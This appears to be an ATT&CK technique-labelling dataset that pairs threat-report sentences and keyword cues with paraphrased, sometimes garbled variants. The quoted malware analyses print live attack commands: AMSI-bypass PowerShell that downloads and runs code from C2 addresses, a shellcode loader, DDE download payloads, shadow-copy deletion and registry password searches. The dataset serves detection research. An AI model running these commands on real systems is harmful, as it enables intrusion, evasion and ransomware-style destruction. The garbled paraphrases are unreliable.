    "The PowerShell command decodes to the following:$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')          {                          $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command             IEX $exec         }         else         {             $exec = [System.Convert]::FromBase64String($command)             $exec = [Text.Encoding]::Unicode.GetString($exec)             IEX $exec         }The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};     try{      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)     }catch{}     IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');This decoded PowerShell script attempts to download and execute a file using HTTP from the URL “hxxp:// 139.59.46[.]154:3485 /IMo8oosieVai”": [],
    "In the example above, the “spp.exe” executable would be added to an auto-run registry key at: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplore Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key “agkrhfpdbvhdhrkj”; however, the loader’s main goal involved running the following command:/c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsA&lt;snip&gt;The base64 encoded command decodes to the following:$0o8e = '$f9B = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = &lt;shellcode REDACTED for brevity&gt;;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = \"-enc \";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"&amp; $b32 $DKn $e\"}else{;iex \"&amp; powershell $DKn $e\";}The decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it": [],
    "Upon execution in a vulnerable environment, the PowerShell based payload takes over": [
        {
            "tec_id": "T1546.013",
            "en_text": "Upon execution in a vulnerable environment, the PowerShell based payload takes over",
            "data_text": "When performed in a vulnerable environment, the PowerShell-based payload takes responsibility"
        }
    ],
    "The PowerShell script is responsible for downloading the final payload from C2 server to execute it": [
        {
            "tec_id": "T1546.013",
            "en_text": "The PowerShell script is responsible for downloading the final payload from C2 server to execute it",
            "data_text": "The PowerShell script is responsible for loading the final payload from the C2 server to run it."
        }
    ],
    "Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)": [
        {
            "tec_id": "T1546.013",
            "en_text": "Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)",
            "data_text": "Use of the non-public PowerShell backdoor described by Morphisek and MalwareBytes (which we call POWERSTATS)"
        }
    ],
    "Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes": [
        {
            "tec_id": "T1546.013",
            "en_text": "Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes",
            "data_text": "The error and assignment of the Deobfuscated PowerShell attack code used by the MuddyWater group is reminiscent of previously seen PowerShell scripts that most likely served as prototypes."
        }
    ],
    "Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO": [
        {
            "tec_id": "T1546.013",
            "en_text": "Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO",
            "data_text": "PowerShell lock policy, must be set to \"AllSigned\" via GPO"
        }
    ],
    "These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.  hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server": [
        {
            "tec_id": "T1546.013",
            "en_text": "These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.  hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server",
            "data_text": "These PowerShell scripts are end-to-end bootable at the stage – they include a domain generation function (DGA) downloader and a backdoor component that connects to the C2 server to get commands and perform additional malicious actions. hUpdateCheckers.ps1 (POWRUNER) the POWRUNER backdoor component is a PowerShell script that sends and receives commands to and from the C2 server."
        }
    ],
    "The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d)  contains the following formula that Excel will save to the “A0” cell in the worksheet:  The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1": [],
    "The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool": [
        {
            "tec_id": "T1546.013",
            "en_text": "The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool",
            "data_text": "PowerShell's decompressed download has some similarities to the PowerShell Empire agent, such as using jitter and commands mentioned by the Job ID, but we have no conclusive evidence that the author of this tool used Empire as the basis for his tool"
        }
    ],
    "It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe \"Office365DCOMCheck.vbs\" \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>\"     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload": [
        {
            "tec_id": "T1546.013",
            "en_text": "It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe \"Office365DCOMCheck.vbs\" \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>\"     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload",
            "data_text": "It will run the newly downloaded PowerShell script by running the following command via cmd /c: wscript.exe \"Office365DCOMCheck.vbs\" \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>\" In this case, the downloaded second program is successful.werShell payload"
        }
    ],
    "The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops": [
        {
            "tec_id": "T1546.013",
            "en_text": "The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops",
            "data_text": "The Information Gathering Tool (IGT) is encoded in Delphi and includes powershell and SQL components on a dozen different drops"
        }
    ],
    "The following shows this unused command, which exposed an additional server within Sofacy’s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET": [],
    "The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document": [
        {
            "tec_id": "T1546.013",
            "en_text": "The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document",
            "data_text": "In VBScript there is SHA256 has 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls for two PowerShell commands to download and execute payload and download and open a document for the digest"
        }
    ],
    "Then, it will launch Dec.exe using PowerShell with the command “ cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized ”.": [
        {
            "tec_id": "T1546.013",
            "en_text": "Then, it will launch Dec.exe using PowerShell with the command “ cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized ”.",
            "data_text": "It will then run Dec.exe using the command \" cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized \"."
        }
    ],
    "FIN6 used PowerShell to execute an encoded command": [
        {
            "tec_id": "T1546.013",
            "en_text": "FIN6 used PowerShell to execute an encoded command",
            "data_text": "FIN6 used PowerShell to execute the encoded command"
        }
    ],
    "The attacker made use of Cobalt Strike’s “psexec” lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell": [
        {
            "tec_id": "T1546.013",
            "en_text": "The attacker made use of Cobalt Strike’s “psexec” lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell",
            "data_text": "The attacker used the \"psexec\" side-motion command Cobalt Strike to create a Windows service with a random 16-character string on the target system and execute an encoded PowerShell."
        }
    ],
    "After decoding out the blob, analysts found a PowerShell script.": [
        {
            "tec_id": "T1546.013",
            "en_text": "After decoding out the blob, analysts found a PowerShell script.",
            "data_text": "After highlighting the blobs, analysts found the PowerShell script."
        }
    ],
    "Next, the script triggered a PowerShell stager": [
        {
            "tec_id": "T1546.013",
            "en_text": "Next, the script triggered a PowerShell stager",
            "data_text": "The script was then called PowerShell Stager"
        }
    ],
    "The macro contains a PowerShell script to persist in the \"Run\" registry key, \"KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding\".": [
        {
            "tec_id": "T1546.013",
            "en_text": "The macro contains a PowerShell script to persist in the \"Run\" registry key, \"KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding\".",
            "data_text": "The Programme contains your PowerShell, persist in the \"Run\" registry key, \" KCU\\Software\\Microsoft.Windows\\CurrentVersion \" Run\\SystemTextEncoding. \""
        }
    ],
    "Following successful infiltration, the malware persists through registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run The command line execution leads to PowerShell code executed from a different registry value .": [],
    "the PowerShell is executed using reflectively loaded ReflectivePicker from the Empire project": [
        {
            "tec_id": "T1546.013",
            "en_text": "the PowerShell is executed using reflectively loaded ReflectivePicker from the Empire project",
            "data_text": "PowerShell is performed using a reflective loaded ReflectivePicker from the Empire project"
        }
    ],
    "PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs.": [
        {
            "tec_id": "T1546.013",
            "en_text": "PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs.",
            "data_text": "PowerShell scripts that perform system reconnaissance and theft of credentials from Windows Credential Manager and then send that information back to Waterbug C"
        }
    ],
    "A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017).  Conclusion We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries)": [
        {
            "tec_id": "T1550.002",
            "en_text": "A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017).  Conclusion We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries)",
            "data_text": "Code comparison of the 12c786c4903667cf7279fc141921d8 hash with the 6de6a0df263ecd2d71a92597b2362f2c hash (since November 28, 2017). Conclusion We found that this could be an early stage of data collection for future possible theft of financial institutions in Turkey (and possibly other countries)"
        }
    ],
    "The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded": [
        {
            "tec_id": "T1106",
            "en_text": "The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded",
            "data_text": "The script is used to decode and execute the following useful downloads: Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actionsCreate persistence to run the Freenki sample at the next reboot.Check the specific files on the infected machine.The first action is to create a registry key to run the previously downloaded Windows-KB275122-x86.exe file"
        }
    ],
    "In this context the main function is executed.\"Console\": with the argument, a persistence is configured and the malware will be executed at the next reboot ( HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runsample ).\"Sample\": with this argument, the malware executes the console command followed by the help command.The information collected is performed using WMI queries:Additionally the malware lists the running process via the Microsoft Windows API": [],
    "The overwritten instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function": [],
    "The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer": [],
    "FInally , the newest sample uses dynamic API lookups to attempt to make static disassembly harder to understand.": [],
    "Windows API calls ": [],
    " Win32 API": [],
    "CreateProcess ": [
        {
            "tec_id": "T1106",
            "en_text": "CreateProcess ",
            "data_text": "Creating a Process"
        }
    ],
    " LoadLibrary ": [],
    " LoadModule() ": [],
    " \nLoadPackagedLibrary() ": [],
    " WinExec() ": [],
    " ShellExecute": [],
    "Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs": [],
    "Unpacks the code in memory via process hollowing": [],
    "It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable": [],
    "Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process": [],
    "Figure 6 Example of delivery document The RTF document (8cf3bc2bf…) was very small in size at 264 bytes, which can be seen in its entirety here:       {\\rtf1{\\field{\\*\\fldinst DDEAUTO \"C:\\\\\\\\WIndowS\\\\\\\\SYsTem32\\\\\\\\cMD.eXe \" \"/C\tPOWErsHELl.eXE  -ex     BypaSs  -NOP\t-w      HIdDen  (NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'  ,       '%apPDAtA%\\graph.exe'   )   ;       saps    '%Appdata%\\graph.exe'\"}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload": [],
    "Figure 1 Article referenced by decoy document in attack against British government agency   The attached document leverages a DDE exploit to ultimately execute the following code:c:\\\\windows\\\\system32\\\\cmd.exe \"/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\\\AAA.exe');Start-Process('%TEMP%\\\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it": [],
    "Upon execution, this Trojan checks to see if it was configured with “BINDERON” to determine if it should extract an embedded payload from a resource named “B”, save it to %TEMP%\\%BIND1%, and create a new process with the embedded payload": [],
    "Indicators of compromise MITRE ATT&CK techniques  Modify existing service Code signing File deletion Deobfuscate/decode files or information System information discovery Process discovery Service execution RunDLL32 Scripting Command-line Interface Data from local system Automated exfiltration Data encrypted Commonly used port Bypass user account control  Hashes  fe32d29fa16b1b71cd27b23a78ee9f6b7791bff3 f684e15dd2e84bac49ea9b89f9b2646dc32a2477 1d280a77595a2d2bbd36b9b5d958f99be20f8e06 19d9573f0b2c2100accd562cc82d57adb12a57ec f90a2155ac492c3c2d5e1d83e384e1a734e59cc0 9b832dda912cce6b23da8abf3881fcf4d2b7ce09 f3b62fea38cb44e15984d941445d24e6b309bc7b 66d2cea01b46c3353f4339a986a97b24ed89ee18 7113aaab61cacb6086c5531a453adf82ca7e7d03 d41daba0ebfa55d0c769ccfc03dbf6a5221e006a 25f4819e7948086d46df8de2eeeaa2b9ec6eca8c 35ab747c15c20da29a14e8b46c07c0448cef4999 e87de3747d7c12c1eea9e73d3c2fb085b5ae8b42 0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0 bca861a46d60831a3101c50f80a6d626fa99bf16 01530adb3f947fabebae5d9c04fb69f9000c3cef 4229896d61a5ad57ed5c247228606ce62c7032d0 4c7e975f95ebc47423923b855a7530af52977f57 5a6ad7a1c566204a92dd269312d1156d51e61dc4 1dc50bfcab2bc80587ac900c03e23afcbe243f64 003e21b02be3248ff72cc2bfcd05bb161b6a2356 9b7c3c48bcef6330e3086de592b3223eb198744a 85e2453b37602429596c9681a8c58a5c6faf8d0c  Domains  ftp.byethost31.com ftp.byethost11.com 1113427185.ifastnet.org navermail.byethost3.com nihon.byethost3.com": [],
    "Figure 15: Structure used to send data to server    Figure 16: Structure used to send data to C2 server The structure is converted to Base64 using the CryptBinaryToStringA function": [],
    "It then uses WebDAV to upload to a Box cloud drive.": [],
    "Registry key “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ” is queried to check the values ConsentPromptBehaviorAdmin and PromptOnSecureDesktop": [],
    "Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use": [],
    "An example of this decompressed configuration may be seen below:  Figure 2 Decompressed Reaver configuration This configuration contains multiple pieces of information, including the following:  Network port Sleep timer between network requests Remote Command and Control (C2) Service Name Service Description Service Display Name Hardcoded String": [],
    "Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:  Form1.Speed Form1.diomadnfagaghagh Form1.fjcsERIfjfiojsGHIsdifjksi Form1.gsgjIDJIGJIGJIGJIFDOSpl Form1.FJaioefgkaoeK  This chain of functions eventually loads a resource named ‘GSrdofjksrgj’, which the tool decrypts using the same algorithm and key as in the initial payload:byte[] array4 = new byte[] {     19,     129,     43,     37,     56,     65,     255,     75,     111,     19,     211,     120,     0,     49,     126,     248 };The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool": [],
    "The files we recovered indicate they do it by executing a script file, which uses the Sysinternals  psexec tool to move laterally by trying to copy it to every machine they can reach:": [],
    "The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s": [],
    "The backdoor will modify the registry for the Windows Media Player to store its C&C configuration.": [],
    "The specific sandbox checks include:  Using WMI to check BIOS version (SMBIOSBIOSVERSION) for VBOX, bochs, qemu, virtualbox and vm": [],
    "Mouse Pointer Check The Trojan will perform the following WMI query:   Select * from Win32_PointingDevice   The Trojan will check the Caption, Description, HardwareType, InfSection, Manufacturer and Name fields in the results for the string VMware, Virtual, VBox, VM or Oracle": [
        {
            "tec_id": "T1497.001",
            "en_text": "Mouse Pointer Check The Trojan will perform the following WMI query:   Select * from Win32_PointingDevice   The Trojan will check the Caption, Description, HardwareType, InfSection, Manufacturer and Name fields in the results for the string VMware, Virtual, VBox, VM or Oracle",
            "data_text": "Check the mouse pointer Trojan is the next WMI : Select the * of Win32_PointingDevice Trojan is the Caption entry, Description, HardwareType, Infection is, Manufacturer - and Name of the results for the VMware, Virtual, VBox, VM or an Oracle."
        }
    ],
    "Hard Disk Check The Trojan will perform the following WMI query:   Select * from Win32_DiskDrive   The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle": [],
    "Motherboard Check The Trojan will perform the following WMI query:   Select * from Win32_BaseBoard   The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle": [],
    "VMware DLL Check The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in the system directory": [],
    "The OopsIE payload checks to see if the result of this query as more than 0 elements to determine if it is running on a virtual machine": [],
    "ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored.": [],
    "Microphone, Voice IP applications": [],
    "High resolution screenshots of specified process windows and when recording VoiceIP application audio": [],
    "capturing audio ": [],
    " capture microphone ": [],
    " record audio": [],
    "Get-MicrophoneAudio": [
        {
            "tec_id": "T1123",
            "en_text": "Get-MicrophoneAudio",
            "data_text": "MicrophoneAudio"
        }
    ],
    "To ensure its victim will use IE, it will terminate any process in-focus that is Chrome or Firefox, in hopes the victim will believe the browsers are “malfunctioning.” Whenever a victim uses IE and browses to specific Brazilian banks or businesses, the malware will only then begin to log keystrokes": [],
    "The usage of LinkedIn to deliver malicious documents,": [],
    "At the same time, Enc.exe will start the encryption routine and append “. jcry ” as file extension to the encrypted file.": [],
    "Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.": [],
    "A new child process is created as “ tg ​ yt ​ ut ​ rc ​ ( ID) ​ .e ​ xe - i SM- tgytutrc ”, which is used to encrypt a single file on the drive": [
        {
            "tec_id": "T1486",
            "en_text": "A new child process is created as “ tg ​ yt ​ ut ​ rc ​ ( ID) ​ .e ​ xe - i SM- tgytutrc ”, which is used to encrypt a single file on the drive",
            "data_text": "The new child process is created as \" tg yt ut rc ( ID) .e car - i SM- tgytutrc \" which is used to encrypt a single file on disk"
        }
    ],
    "After the encryption of file, it will delete shadow copies with the command “ vssadmin delete shadows /all ” to ensure that all the data cannot be restored easily.": [],
    "Opening document starts a template injection technique for loading the document template from the internet.": [],
    "remote template ": [
        {
            "tec_id": "T1221",
            "en_text": "remote template ",
            "data_text": "remote template"
        }
    ],
    " template injeciton": [
        {
            "tec_id": "T1221",
            "en_text": " template injeciton",
            "data_text": "injecton template"
        }
    ],
    "The Data field is encrypted using a custom stream cipher.": [],
    "Once encrypted, the system information is sent in the body of an HTTP POST": [
        {
            "tec_id": "T1486",
            "en_text": "Once encrypted, the system information is sent in the body of an HTTP POST",
            "data_text": "After encryption, system information is sent to the HTTP POST body"
        }
    ],
    "Finally the script deletes the shadow copies, in a preparation for the ransomware operations.": [],
    "They apparently create a Domain Admin account  named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands.": [],
    "MS##-### ": [
        {
            "tec_id": "T1210",
            "en_text": "MS##-### ",
            "data_text": "MS##-#####"
        }
    ],
    " smb and exploit in same sentence ": [
        {
            "tec_id": "T1210",
            "en_text": " smb and exploit in same sentence ",
            "data_text": "smb and exploit in the same phrase"
        }
    ],
    "MS\\d{2}-\\d{3}": [],
    "FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration": [],
    "net group ": [],
    " Get-LocAdm": [],
    "The decoy file, doc.rtf, contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP%": [],
    "OLE ": [],
    " OLE object ": [],
    "The decrypted shellcode is dropped as a Microsoft Word plugin WLL  into C:\\Users\\ADMINI~1\\AppData\\Roaming\\Microsoft\\Word\\STARTUP.": [],
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ": [],
    "In order to evade network level detection, the downloader uses steganography.": [],
    "The wormDll32 module attempts to identify servers and domain controllers in the network using NetServerEnum and LDAP queries.": [],
    "objectClass=trustedDomain ": [],
    " nltest /domain_trusts ": [
        {
            "tec_id": "T1482",
            "en_text": " nltest /domain_trusts ",
            "data_text": "Nltest /domain_trusts"
        }
    ],
    " Get-NetDomainTrust ": [],
    " Get-NetForestTrust ": [],
    "This module searches the infected system’s files to gather email addresses for information-stealing purposes.": [],
    "send a POST response to the C&C server to extract the user’s login credentials. redirect users to fake phishing websites.": [],
    "A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file.": [
        {
            "tec_id": "T1025",
            "en_text": "A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file.",
            "data_text": "A USB data collection, checks your flash drive and steals some file types for them into a ZIP file...."
        }
    ],
    "bootkit": [],
    "UserInitMprLogonScript": [],
    "load additional modules": [],
    "NTDLL.dll ": [],
    " LoadLibraryExW()": [],
    " DWriteCreateFactory() ": [],
    "Inveigh ": [],
    " NBNS Spoofing ": [],
    " poison name services": [],
    "VPN and to persist in same sentence ": [],
    "Tor plugin ": [
        {
            "tec_id": "T1090.004",
            "en_text": "Tor plugin ",
            "data_text": "Tor plug-in"
        }
    ],
    "SID-History ": [],
    " MISC::AddSid": [],
    "ChangeServiceConfigW ": [],
    "overwrite or delete MBR in same sentence ": [],
    "  master boot record wiper ": [],
    " MBR + overwrite/wipe": [
        {
            "tec_id": "T1561.002",
            "en_text": " MBR + overwrite/wipe",
            "data_text": "MBR + rewrite/clean"
        }
    ],
    "reg query HKLM /f password /t REG_SZ /s ": [
        {
            "tec_id": "T1552.002",
            "en_text": "reg query HKLM /f password /t REG_SZ /s ",
            "data_text": "Reg request HKLM /f password /t REG_SZ /s"
        }
    ],
    " reg query HKCU /f password /t REG_SZ /s ": [],
    "appinit_dll": [
        {
            "tec_id": "T1546.010",
            "en_text": "appinit_dll",
            "data_text": "appinit_dll"
        }
    ],
    "SQL inject": [],
    "Team Viewer ": [],
    " TeamViewer ": [],
    " VNC ": [],
    " Ammy ": [],
    " Go2Assist ": [],
    " LogMeing ": [],
    " AmmyAdmin": [],
    "msiexec, odbcconf": [],
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ": [],
    " AppCertDLL": [],
    "winlogon": [],
    "chmod ": [],
    " attrib +h ": [],
    " icacls . /grant Everyone:F /T /C /Q": [
        {
            "tec_id": "T1222",
            "en_text": " icacls . /grant Everyone:F /T /C /Q",
            "data_text": "Icacs . /Give Every:F /T /C /Q"
        }
    ],
    "API hooking ": [
        {
            "tec_id": "T1056.004",
            "en_text": "API hooking ",
            "data_text": "API Hawking"
        }
    ],
    "SetWindowsHookEx": [],
    "UEFI BIOS ": [],
    "lsass.exe ": [],
    "COM and execution in same sentence ": [],
    " Invoke-DCOM ": [],
    " DCOM ": [],
    " COM execution": [],
    "cmstp.exe": [],
    "environmental keying": [],
    "COM + hijack in same sentence": [],
    "sticky key ": [],
    "C:\\Windows\\System32\\sethc.exe ": [],
